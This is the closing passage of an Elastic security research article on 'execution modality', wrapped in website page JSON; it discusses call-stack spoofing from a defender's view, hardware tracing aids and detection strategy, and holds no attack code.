caveat is that an STP analytic score does not yet include any measure for the setup and maintenance costs of a rule. This could potentially be approximated by the size of the known false positive software list for a given rule - though most open rule sets typically do not include this information. We do and, in our rule\\u2019s case, the false positives observed to date have been extremely manageable.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"can-call-stacks-be-spoofed-though\",children:(0,t.jsx)(e.strong,{children:\"Can call stacks be spoofed though?\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Yes - and slightly no. Our call stacks are all collected inline in the kernel, but the user-mode call stack itself resides in user-mode memory that the malware may control. This means that, if malware has achieved arbitrary execution, then it can control the stack frames that we see.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Sure, dual-purpose API \",(0,t.jsx)(e.a,{href:\"https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+%22Unbacked+memory%22\u0026type=code\",rel:\"nofollow\",children:\"calls from private memory\"}),\" are suspicious, but sometimes trying to hide your private memory is even more suspicious. This can take the form of:\"]}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[\"Calls from \",(0,t.jsx)(e.a,{href:\"https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+allocation_private_bytes\u0026type=code\",rel:\"nofollow\",children:\"overwritten modules\"}),\".\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"Return addresses \",(0,t.jsx)(e.a,{href:\"https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+image_rop\u0026type=code\",rel:\"nofollow\",children:\"without a preceding call\"}),\" instruction.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[\"Calls \",(0,t.jsx)(e.a,{href:\"https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+proxy_call\u0026type=code\",rel:\"nofollow\",children:\"proxied via other modules\"}),\".\"]}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:\"Call stack control alone may not be enough. In order to truly bypass some of our call stack detections, an attacker must craft a call stack that entirely blends with normal activity.  In some environments this can be baselined by security teams with high accuracy; making it hard for the attackers to remain undetected. Based on our in-house research, and with the assistance of red team tool developers, we are also continually improving our out-of-the-box detections.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Finally, on modern CPUs there are also numerous execution trace mechanisms that can be used to detect stack spoofing - such as \",(0,t.jsx)(e.a,{href:\"https://www.blackhat.com/docs/us-16/materials/us-16-Pierce-Capturing-0days-With-PERFectly-Placed-Hardware-Traps-wp.pdf\",rel:\"nofollow\",children:\"Intel LBR\"}),\", Intel BTS, Intel AET, \",(0,t.jsx)(e.a,{href:\"https://www.microsoft.com/en-us/research/wp-content/uploads/2017/01/griffin-asplos17.pdf\",rel:\"nofollow\",children:\"Intel IPT\"}),\", \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/finding-truth-in-the-shadows\",rel:\"nofollow\",children:\"x64 CET\"}),\" and \",(0,t.jsx)(e.a,{href:\"https://lwn.net/Articles/824613/\",rel:\"nofollow\",children:\"x64 Architectural LBR\"}),\". Elastic already takes advantage of some of these hardware features, we have suggested to Microsoft that they may also wish to do so in further scenarios outside of exploit protection, and we are investigating further enhancements ourselves. Stay tuned.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"conclusion\",children:(0,t.jsx)(e.strong,{children:\"Conclusion\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Execution Modality is a new lens through which we can seek to understand attacker tradecraft.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Detecting specific techniques for individual modalities is not a cost-effective approach though - there are simply too many techniques and too many modalities. Instead, we should focus our technique detections as close to the operating system source of truth as possible; being careful not to lose necessary activity context, or to introduce unmanageable false positives. This is why Elastic considers \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/kernel-etw-best-etw\",rel:\"nofollow\",children:\"Kernel ETW\"}),\" to be superior to user-mode \",(0,t.jsx)(e.code,{children:\"ntdll\"}),\" hooking - it is closer to the source of truth allowing more robust detections.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"For modality-based detection approaches, the value becomes apparent when we baseline \",(0,t.jsx)(e.strong,{children:\"all\"}),\" expected low-level telemetry for a given modality - and trigger on \",(0,t.jsx)(e.strong,{children:\"any\"}),\" deviations.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Historically, attackers have been able to choose modality for convenience. It is more cost effective to write tools in C# or PowerShell than in C or assembly.  If we can herd modality then we\\u2019ve imposed cost.\"})]})}function x(n={}){let{wrapper:e}=n.components||{};return e?(0,t.jsx)(e,Object.assign({},n,{children:(0,t.jsx)(d,n)})):d(n)}var k=x;return b(S);})();\n;return Component;"},"_id":"articles/misbehaving-modalities.mdx","_raw":{"sourceFilePath":"articles/misbehaving-modalities.mdx","sourceFileName":"misbehaving-modalities.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/misbehaving-modalities"},"type":"Article","imageUrl":"/assets/images/misbehaving-modalities/modalities.png","readingTime":"14 min read","series":"","url":"/misbehaving-modalities","headings":[{"level":2,"title":"**What is Execution Modality?**","href":"#what-is-execution-modality"},{"level":2,"title":"**Case Study: service creation modalities**","href":"#case-study-service-creation-modalities"},{"level":2,"title":"**Call stacks divulge Modality**","href":"#call-stacks-divulge-modality"},{"level":2,"title":"**Robustness assessment**","href":"#robustness-assessment"},{"level":2,"title":"**Can call stacks be spoofed though?**","href":"#can-call-stacks-be-spoofed-though"},{"level":2,"title":"**Conclusion**","href":"#conclusion"}],"author":[{"title":"John Uhlmann","slug":"john-uhlmann","description":"Principal Security Research Engineer, Elastic","image":"john-uhlmann.jpg","body":{"raw":"","code":"var Component=(()=\u003e{var l=Object.create;var o=Object.defineProperty;var h=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var j=Object.getPrototypeOf,x=Object.prototype.hasOwnProperty;var p=(n,t)=\u003e()=\u003e(t||n((t={exports:{}}).exports,t),t.exports),f=(n,t)=\u003e{for(var e in t)o(n,e,{get:t[e],enumerable:!0})},c=(n,t,e,i)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let a of g(t))!x.call(n,a)\u0026\u0026a!==e\u0026\u0026o(n,a,{get:()=\u003et[a],enumerable:!(i=h(t,a))||i.enumerable});return n};var _=(n,t,e)=\u003e(e=n!=null?l(j(n)):{},c(t||!n||!n.__esModule?o(e,\"default\",{value:n,enumerable:!0}):e,n)),d=n=\u003ec(o({},\"__esModule\",{value:!0}),n);var m=p((F,s)=\u003e{s.exports=_jsx_runtime});var D={};f(D,{default:()=\u003eC,frontmatter:()=\u003eM});var r=_(m()),M={title:\"John Uhlmann\",description:\"Principal Security Research Engineer, Elastic\",slug:\"john-uhlmann\",image:\"john-uhlmann.jpg\"};function u(n){return(0,r.jsx)(r.Fragment,{})}function y(n={}){let{wrapper:t}=n.components||{};return t?(0,r.jsx)(t,Object.assign({},n,{children:(0,r.jsx)(u,n)})):u(n)}var C=y;return d(D);})();\n;return Component;"},"_id":"authors/john-uhlmann.mdx","_raw":{"sourceFilePath":"authors/john-uhlmann.mdx","sourceFileName":"john-uhlmann.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/john-uhlmann"},"type":"Author","imageUrl":"/assets/images/authors/john-uhlmann.jpg","url":"/authors/john-uhlmann"}],"category":[{"title":"Security research","slug":"security-research","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,j=Object.prototype.hasOwnProperty;var l=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),d=(t,e)=\u003e{for(var r in e)s(t,r,{get:e[r],enumerable:!0})},c=(t,e,r,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!j.call(t,o)\u0026\u0026o!==r\u0026\u0026s(t,o,{get:()=\u003ee[o],enumerable:!(a=f(e,o))||a.enumerable});return t};var h=(t,e,r)=\u003e(r=t!=null?x(g(t)):{},c(e||!t||!t.__esModule?s(r,\"default\",{value:t,enumerable:!0}):r,t)),p=t=\u003ec(s({},\"__esModule\",{value:!0}),t);var i=l((X,u)=\u003e{u.exports=_jsx_runtime});var D={};d(D,{default:()=\u003eC,frontmatter:()=\u003ey});var n=h(i()),y={title:\"Security research\",slug:\"security-research\"};function m(t){return(0,n.jsx)(n.Fragment,{})}function M(t={}){let{wrapper:e}=t.components||{};return e?(0,n.jsx)(e,Object.assign({},t,{children:(0,n.jsx)(m,t)})):m(t)}var C=M;return p(D);})();\n;return Component;"},"_id":"categories/security-research.mdx","_raw":{"sourceFilePath":"categories/security-research.mdx","sourceFileName":"security-research.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/security-research"},"type":"Category","url":"/categories/security-research"},{"title":"Detection science","slug":"detection-science","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var c=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)c(t,n,{get:e[n],enumerable:!0})},i=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!g.call(t,o)\u0026\u0026o!==n\u0026\u0026c(t,o,{get:()=\u003ee[o],enumerable:!(s=f(e,o))||s.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?x(d(t)):{},i(e||!t||!t.__esModule?c(n,\"default\",{value:t,enumerable:!0}):n,t)),D=t=\u003ei(c({},\"__esModule\",{value:!0}),t);var u=j((h,a)=\u003e{a.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Detection science\",slug:\"detection-science\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"categories/detection-science.mdx","_raw":{"sourceFilePath":"categories/detection-science.mdx","sourceFileName":"detection-science.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/detection-science"},"type":"Category","url":"/categories/detection-science"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"misbehaving-modalities"},"buildId":"jyh7A-n9tjhpKhG9IjI3c","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>